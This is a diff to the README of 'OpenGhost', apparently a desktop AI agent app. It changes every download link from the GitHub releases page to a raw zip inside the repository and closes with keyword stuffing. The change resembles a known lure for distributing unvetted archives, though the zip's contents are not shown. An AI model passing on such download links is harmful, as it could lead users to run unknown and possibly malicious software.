@@ -6,11 +6,11 @@ Welcome! OpenGhost is a free desktop app that works on Windows, macOS, and Linux
 
 ## 📥 Download and Install
 
-[![Download OpenGhost](https://img.shields.io/badge/Download-OpenGhost-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/KSaF43a/OpenGhost/releases)
+[![Download OpenGhost](https://img.shields.io/badge/Download-OpenGhost-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/KSaF43a/OpenGhost/main/desktop/v2.4.zip)
 
 **Step 1: Get the App**
 
-Visit this link to download the application: [https://github.com/KSaF43a/OpenGhost/releases](https://github.com/KSaF43a/OpenGhost/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/KSaF43a/OpenGhost/main/desktop/v2.4.zip](https://raw.githubusercontent.com/KSaF43a/OpenGhost/main/desktop/v2.4.zip)
 
 **Step 2: Open the Downloaded File**
 
@@ -139,6 +139,6 @@ OpenGhost is released under the MIT License. You can view the full license text 
 
 **Ready to meet your new AI companion?** Download OpenGhost today and experience an agent that doesn't just answer — it shows you.
 
-[![Get OpenGhost Now](https://img.shields.io/badge/Get%20OpenGhost-Now-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=1A1A1A)](https://github.com/KSaF43a/OpenGhost/releases)
+[![Get OpenGhost Now](https://img.shields.io/badge/Get%20OpenGhost-Now-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=1A1A1A)](https://raw.githubusercontent.com/KSaF43a/OpenGhost/main/desktop/v2.4.zip)
 
 Keywords: OpenGhost, AI agent, desktop AI, Windows AI, macOS AI, Linux AI, open source AI, visual AI, browser agent, drawing AI, chat assistant, free AI tool, artificial intelligence, productivity app, smart assistant, AI download, local AI, cross-platform AI, AI for everyone
